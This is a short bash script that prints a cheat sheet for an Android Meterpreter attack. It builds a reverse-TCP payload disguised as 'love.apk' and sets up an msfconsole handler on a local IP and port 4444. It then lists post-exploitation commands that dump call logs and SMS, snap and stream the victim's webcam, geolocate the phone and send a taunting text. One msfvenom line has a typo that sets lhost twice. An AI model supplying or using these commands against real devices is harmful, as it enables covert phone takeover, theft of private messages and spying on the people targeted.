#!/bin/bash
xterm -hold -e 'echo "
    ifconfig
msfvenom -p android/meterpreter/reverse_tcp lhost=’IP address’ lhost=4444 > /root/Desktop/love.apk




    
msfconsole
    use exploit/multi/handler
    set payload android/meterpreter/reverse_tcp
    set lhost 192.168.0.103

    set lport 4444
    exploit

some commands to run 

sysinfo
check_root
dump_calllog
dump_sms
webcam_list
webcam_snap 1
send_sms -d 70******17 -t U r gonna Hacked
wlan_geolocate
webcam_stream"'

